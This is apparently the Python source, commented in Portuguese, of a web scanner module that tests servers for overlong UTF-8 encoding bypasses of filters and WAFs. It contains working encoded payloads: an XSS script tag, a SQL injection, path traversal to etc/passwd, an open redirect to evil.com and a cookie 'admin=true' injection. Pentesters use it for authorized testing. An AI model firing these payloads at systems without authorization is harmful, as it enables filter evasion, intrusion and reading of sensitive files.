#!/usr/bin/env python3
"""Modulo de testes de Overlong UTF-8 Encoding Bypass.

Testa se o servidor e vulneravel a bypass de filtros via overlong encoding:
  - Paths com overlong encoding (/ -> %c0%af)
  - Parametros GET/POST com overlong encoding
  - Headers com overlong encoding
  - WAF bypass via overlong encoding (XSS, SQLi, redirect)

Overlong encoding usa mais bytes que o necessario para codificar um caractere
UTF-8. Por exemplo, '/' (U+002F) pode ser codificado como:
  - Padrão 1-byte: %2f
  - Overlong 2-byte: %c0%af
  - Overlong 3-byte: %e0%80%af
  - Overlong 4-byte: %f0%80%80%af

WAFs e filtros que so reconhecem encodings padrao podem ser contornados.

Fluxo:
  1. Envia requisicao baseline sem encoding
  2. Envia requisicoes com payloads overlong-encoded
  3. Compara respostas (status, tamanho, headers, corpo)
  4. Classifica cada tecnica: vulnerable, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import asyncio
import logging
from collections.abc import Awaitable, Callable
from dataclasses import asdict, dataclass
from urllib.parse import urlparse, urlunparse

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.overlongencoding")

_CATEGORY_MAP: dict[str, list[str]] = {
    "url": ["overlong_path", "overlong_query", "overlong_fragment"],
    "param": ["overlong_get", "overlong_post", "overlong_json"],
    "header": ["overlong_referer", "overlong_cookie", "overlong_ua"],
    "waf": ["overlong_xss", "overlong_sqli", "overlong_redirect"],
}


def _overlong_2byte(char: str) -> str:
    """Codifica caractere em overlong UTF-8 de 2 bytes.

    Mapeia o codepoint para sequencia percent-encoded de 2 bytes:
      byte1 = 0xC0 | (cp >> 6)
      byte2 = 0x80 | (cp & 0x3F)
    """
    cp = ord(char)
    b1 = 0xC0 | (cp >> 6)
    b2 = 0x80 | (cp & 0x3F)
    return f"%{b1:02x}%{b2:02x}"


def _overlong_3byte(char: str) -> str:
    """Codifica caractere em overlong UTF-8 de 3 bytes.

    Mapeia o codepoint para sequencia percent-encoded de 3 bytes:
      byte1 = 0xE0 | (cp >> 12)
      byte2 = 0x80 | ((cp >> 6) & 0x3F)
      byte3 = 0x80 | (cp & 0x3F)
    """
    cp = ord(char)
    b1 = 0xE0 | (cp >> 12)
    b2 = 0x80 | ((cp >> 6) & 0x3F)
    b3 = 0x80 | (cp & 0x3F)
    return f"%{b1:02x}%{b2:02x}%{b3:02x}"


def _overlong_4byte(char: str) -> str:
    """Codifica caractere em overlong UTF-8 de 4 bytes.

    Mapeia o codepoint para sequencia percent-encoded de 4 bytes:
      byte1 = 0xF0 | (cp >> 18)
      byte2 = 0x80 | ((cp >> 12) & 0x3F)
      byte3 = 0x80 | ((cp >> 6) & 0x3F)
      byte4 = 0x80 | (cp & 0x3F)
    """
    cp = ord(char)
    b1 = 0xF0 | (cp >> 18)
    b2 = 0x80 | ((cp >> 12) & 0x3F)
    b3 = 0x80 | ((cp >> 6) & 0x3F)
    b4 = 0x80 | (cp & 0x3F)
    return f"%{b1:02x}%{b2:02x}%{b3:02x}%{b4:02x}"


_OVERLONG_ENCODINGS: dict[str, Callable[[str], str]] = {
    "2byte": _overlong_2byte,
    "3byte": _overlong_3byte,
    "4byte": _overlong_4byte,
}


_SENSITIVE_CHARS: dict[str, str] = {
    "/": "slash",
    "\\": "backslash",
    "<": "less_than",
    ">": "greater_than",
    "'": "single_quote",
    '"': "double_quote",
    " ": "space",
    ";": "semicolon",
    "\r": "carriage_return",
    "\n": "line_feed",
    "=": "equals",
    "&": "ampersand",
    "(": "open_paren",
    ")": "close_paren",
}


@dataclass(frozen=True, slots=True)
class OverlongAttempt:
    """Tentativa individual de overlong encoding bypass."""

    technique: str
    category: str
    url: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class OverlongResult:
    """Resultado consolidado do scan de overlong encoding bypass."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[OverlongAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _build_overlong_url(url: str, encoded: str, position: str) -> str:
    """Constrói URL com payload overlong-encoded."""
    parsed = urlparse(url)
    if not parsed.scheme:
        parsed = urlparse(f"http://{url}")

    if position == "path":
        path = parsed.path.rstrip("/") + "/" + encoded
        return urlunparse(parsed._replace(path=path))
    elif position == "query":
        existing = parsed.query
        sep = "&" if existing else ""
        new_query = f"{existing}{sep}test={encoded}"
        return urlunparse(parsed._replace(query=new_query))
    elif position == "fragment":
        return urlunparse(parsed._replace(fragment=encoded))
    return url


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


async def _test_overlong_url(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes],
) -> list[OverlongAttempt]:
    """Testa overlong encoding em URLs."""
    attempts: list[OverlongAttempt] = []
    b_status, b_size, _ = baseline

    for char, char_name in _SENSITIVE_CHARS.items():
        for enc_name, enc_fn in _OVERLONG_ENCODINGS.items():
            encoded = enc_fn(char)
            for position in ["path", "query", "fragment"]:
                test_url = _build_overlong_url(url, encoded, position)
                technique = f"overlong_{enc_name}_{position}"

                try:
                    resp = await client.get(test_url, follow_redirects=False)
                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    size_changed = abs(t_size - b_size) > 50
                    vulnerable = status_changed and t_status == 200

                    attempts.append(OverlongAttempt(
                        technique=technique,
                        category="url",
                        url=test_url,
                        payload=f"{char_name}={encoded}",
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=size_changed,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                        error="",
                    ))
                except httpx.RequestError as exc:
                    attempts.append(OverlongAttempt(
                        technique=technique,
                        category="url",
                        url=test_url,
                        payload=f"{char_name}={encoded}",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    ))

    return attempts


async def _test_overlong_params(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes],
) -> list[OverlongAttempt]:
    """Testa overlong encoding em parametros GET/POST."""
    attempts: list[OverlongAttempt] = []
    b_status, b_size, _ = baseline

    parsed = urlparse(url)
    base_url = urlunparse(parsed._replace(query=""))

    test_payloads = [
        ("overlong_get", "GET", {"q": f"test{_overlong_2byte('/')}admin"}),
        ("overlong_post", "POST", {"field": f"value{_overlong_2byte('<')}script"}),
        ("overlong_json", "JSON", {"data": f"payload{_overlong_3byte('\\')}..%e0%80%afe0%80%afetc%e0%80%afpasswd"}),
    ]

    for technique, method, data in test_payloads:
        try:
            if method == "GET":
                resp = await client.get(base_url, params=data, follow_redirects=False)
            elif method == "POST":
                resp = await client.post(base_url, data=data, follow_redirects=False)
            else:
                resp = await client.post(
                    base_url,
                    json=data,
                    headers={"Content-Type": "application/json"},
                    follow_redirects=False,
                )

            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(OverlongAttempt(
                technique=technique,
                category="param",
                url=base_url,
                payload=str(data),
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(OverlongAttempt(
                technique=technique,
                category="param",
                url=base_url,
                payload=str(data),
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_overlong_headers(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes],
) -> list[OverlongAttempt]:
    """Testa overlong encoding em headers."""
    attempts: list[OverlongAttempt] = []
    b_status, b_size, _ = baseline

    header_payloads = [
        ("overlong_referer", "Referer", f"https://example.com{_overlong_2byte('/')}admin"),
        ("overlong_cookie", "Cookie", f"session=abc{_overlong_2byte(';')}admin=true"),
        ("overlong_ua", "User-Agent", f"Mozilla/5.0{_overlong_2byte('<')}script{_overlong_2byte('>')}"),
    ]

    for technique, header_name, header_value in header_payloads:
        try:
            resp = await client.get(url, headers={header_name: header_value}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(OverlongAttempt(
                technique=technique,
                category="header",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(OverlongAttempt(
                technique=technique,
                category="header",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_overlong_waf(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes],
) -> list[OverlongAttempt]:
    """Testa WAF bypass via overlong encoding."""
    attempts: list[OverlongAttempt] = []
    b_status, b_size, _ = baseline

    waf_payloads = [
        ("overlong_xss", f"{_overlong_2byte('<')}script{_overlong_2byte('>')}alert(1){_overlong_2byte('<')}{_overlong_2byte('/')}{_overlong_2byte('>')}script{_overlong_2byte('>')}"),
        ("overlong_sqli", f"{_overlong_2byte('\\')}{_overlong_2byte('\\')} OR 1{_overlong_2byte('=')}1{_overlong_2byte('\\')}{_overlong_2byte('\\')}"),
        ("overlong_redirect", f"http:{_overlong_2byte('/')}{_overlong_2byte('/')}evil.com"),
    ]

    parsed = urlparse(url)
    base_url = urlunparse(parsed._replace(query=""))

    for technique, payload in waf_payloads:
        try:
            resp = await client.get(base_url, params={"input": payload}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(OverlongAttempt(
                technique=technique,
                category="waf",
                url=base_url,
                payload=payload,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(OverlongAttempt(
                technique=technique,
                category="waf",
                url=base_url,
                payload=payload,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def scan_overlong_encoding(
    url: str,
    timeout: float = 10.0,
    user_agent: str | None = None,
    proxy: str | None = None,
    verify: bool = False,
    category: str | None = None,
    concurrency: int = 5,
) -> OverlongResult:
    """Executa scan de overlong UTF-8 encoding bypass contra a URL alvo."""
    parsed = urlparse(url)
    if not parsed.scheme:
        url = f"http://{url}"
        parsed = urlparse(url)

    tls = parsed.scheme == "https"

    async with create_async_client(
        user_agent=user_agent or "MyTools/overlongencoding",
        proxy=proxy,
        timeout=timeout,
        verify=verify,
    ) as client:
        b_status, b_size, _ = await _test_baseline(client, url)
        baseline = (b_status, b_size, b"")

        sem = asyncio.Semaphore(concurrency)

        async def _limited(coro: Awaitable[object]) -> object:
            async with sem:
                return await coro

        tasks: list[Awaitable[object]] = []
        selected = _CATEGORY_MAP.get(category, []) if category else []

        if not category or category == "url":
            tasks.append(_limited(_test_overlong_url(client, url, baseline)))
        if not category or category == "param":
            tasks.append(_limited(_test_overlong_params(client, url, baseline)))
        if not category or category == "header":
            tasks.append(_limited(_test_overlong_headers(client, url, baseline)))
        if not category or category == "waf":
            tasks.append(_limited(_test_overlong_waf(client, url, baseline)))

        if category and not selected:
            return OverlongResult(
                target=url,
                baseline_status=b_status,
                baseline_size=b_size,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=[f"Categoria desconhecida: {category}"],
                overall_status="error",
            )

        results = await asyncio.gather(*tasks, return_exceptions=True)
        all_attempts: list[OverlongAttempt] = []
        for r in results:
            if isinstance(r, list):
                all_attempts.extend(r)

    vulnerable: list[str] = []
    blocked: list[str] = []
    issues: list[str] = []

    seen: set[str] = set()
    for att in all_attempts:
        if att.technique not in seen:
            seen.add(att.technique)
            if att.vulnerable:
                vulnerable.append(att.technique)
            elif att.status_changed:
                blocked.append(att.technique)

    if vulnerable:
        issues.append(f"{len(vulnerable)} tecnicas de overlong encoding vulneraveis")
    if blocked:
        issues.append(f"{len(blocked)} tecnicas bloqueadas pelo servidor")

    overall = "vulnerable" if vulnerable else "blocked" if blocked else "secure"

    return OverlongResult(
        target=url,
        baseline_status=b_status,
        baseline_size=b_size,
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vulnerable,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )


def print_results(result: OverlongResult) -> None:
    """Exibe os resultados do scan formatados."""
    print()
    print(color("=" * 60, Cyber.CYAN))
    print(color("  OVERLONG UTF-8 ENCODING BYPASS SCAN", Cyber.CYAN))
    print(color("=" * 60, Cyber.CYAN))
    print(color(f"  Target: {result.target}", Cyber.WHITE))
    print(color(f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
    print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))

    status_color = Cyber.RED if result.overall_status == "vulnerable" else Cyber.GREEN
    print(color(f"\n  Status: {result.overall_status.upper()}", status_color))

    if result.vulnerable_techniques:
        print(color("\n  [VULNERAVEL]", Cyber.RED))
        for tech in result.vulnerable_techniques:
            print(color(f"    - {tech}", Cyber.RED))

    if result.blocked_techniques:
        print(color("\n  [BLOQUEADO]", Cyber.GREEN))
        for tech in result.blocked_techniques:
            print(color(f"    - {tech}", Cyber.GREEN))

    if result.issues:
        print(color("\n  Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))

    print(color("=" * 60, Cyber.CYAN))


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-overlong",
        description="Overlong UTF-8 Encoding Bypass — testa bypass de filtros via overlong encoding.",
    )
    add_common_args(parser)
    parser.add_argument("url", nargs="?", help="URL alvo para teste")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de teste (url, param, header, waf)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Numero de requisicoes simultaneas (default: 5)",
    )
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan unico e retorna codigo de saida."""
    init_scanner(args)
    url = getattr(args, "url", None) or getattr(args, "target", None)
    if not url:
        print(color("Especifique uma URL alvo.", Cyber.RED))
        return 1

    result = safe_asyncio_run(
        scan_overlong_encoding(
            url=url,
            timeout=getattr(args, "timeout", 10.0),
            user_agent=getattr(args, "user_agent", None),
            proxy=getattr(args, "proxy", None),
            verify=getattr(args, "verify", False),
            category=getattr(args, "category", None),
            concurrency=getattr(args, "concurrency", 5),
        )
    )
    print_results(result)

    output_path = getattr(args, "output", None)
    if output_path:
        write_output(output_path, asdict(result))
        print(color(f"\nResultados salvos em: {output_path}", Cyber.GREEN))

    return 0 if result.overall_status != "error" else 1


banner_art = create_banner(
    r"""
     _   _                      _____                    _
    | \ | |                    / ____|                  | |
    |  \| | _____  ___   _  __| (___  _   _  ___  _ __ | |_
    | . ` |/ _ \ \/ / | | |/ _ \___ \| | | |/ _ \| '_ \| __|
    | |\  |  __/>  <| |_| |  __/___) | |_| |  __/| | | | |_
    |_| \_|\___/_/\_\\__,_|\__|____/ \__, |\___||_| |_|\__|
                                       __/ |
                                      |___/
    """,
    "Overlong UTF-8 Encoding Bypass — detecta bypass via overlong encoding",
)


def main() -> int:
    """Ponto de entrada principal do CLI."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="overlong> ",
        description="Overlong UTF-8 Encoding Bypass interativo.",
        example="https://target.com -c url",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c url\n"
            "  https://target.com -c param\n"
            "  https://target.com -c waf --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
